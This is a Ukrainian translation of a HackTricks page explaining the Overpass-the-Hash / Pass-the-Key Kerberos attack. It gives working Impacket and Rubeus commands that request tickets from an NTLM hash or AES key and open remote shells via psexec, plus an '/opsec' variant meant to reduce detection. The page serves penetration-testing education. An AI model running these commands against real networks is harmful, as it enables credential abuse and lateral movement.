# Пройдіть хеш/передайте ключ

<details>

<summary><strong>Вивчіть хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Ви працюєте в **кібербезпецівій компанії**? Хочете побачити, як ваша **компанія рекламується на HackTricks**? або ви хочете мати доступ до **останньої версії PEASS або завантажити HackTricks у PDF**? Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* Отримайте [**офіційний PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Приєднуйтесь до** [**💬**](https://emojipedia.org/speech-balloon/) [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи телеграм**](https://t.me/peass) або **слідкуйте** за мною на **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до [репозиторію hacktricks](https://github.com/carlospolop/hacktricks) та [репозиторію hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Пройдіть хеш/передайте ключ (PTK)

Атака **Пройдіть хеш/передайте ключ (PTK)** призначена для середовищ, де традиційний протокол NTLM обмежений, а аутентифікація Kerberos має пріоритет. Ця атака використовує хеш NTLM або ключі AES користувача для отримання квитків Kerberos, що дозволяє несанкціонований доступ до ресурсів у мережі.

Для виконання цієї атаки першим кроком є отримання хешу NTLM або пароля облікового запису цільового користувача. Після отримання цієї інформації можна отримати Квиток для надання квитків (TGT) для облікового запису, що дозволяє зловмиснику отримати доступ до служб або машин, до яких користувач має дозвіл.

Процес можна ініціювати за допомогою наступних команд:
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Для сценаріїв, які вимагають AES256, можна використовувати опцію `-aesKey [AES key]`. Крім того, отриманий квиток можна використовувати з різними інструментами, включаючи smbexec.py або wmiexec.py, розширюючи обсяг атаки.

Виявлені проблеми, такі як _PyAsn1Error_ або _KDC cannot find the name_, зазвичай вирішуються шляхом оновлення бібліотеки Impacket або використання імені хоста замість IP-адреси, що забезпечує сумісність з Kerberos KDC.

Альтернативна послідовність команд, використовуючи Rubeus.exe, демонструє ще один аспект цієї техніки:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Цей метод дублює підхід **Pass the Key**, з увагою на захоплення та використання квитка безпосередньо для аутентифікації. Важливо зауважити, що ініціація запиту TGT спричиняє подію `4768: Був запитаний квиток аутентифікації Kerberos (TGT)`, що свідчить про використання RC4-HMAC за замовчуванням, хоча сучасні системи Windows віддають перевагу AES256.

Для відповідності операційній безпеці та використання AES256 можна застосувати наступну команду:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## Посилання

* [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Ви працюєте в **кібербезпеці компанії**? Хочете побачити вашу **компанію рекламовану на HackTricks**? або хочете мати доступ до **останньої версії PEASS або завантажити HackTricks у форматі PDF**? Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Дізнайтеся про [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* **Приєднуйтесь до** [**💬**](https://emojipedia.org/speech-balloon/) [**групи Discord**](https://discord.gg/hRep4RUj7f) або групи [**telegram**](https://t.me/peass) або **слідкуйте** за мною на **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до [репозиторію hacktricks](https://github.com/carlospolop/hacktricks) та [репозиторію hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
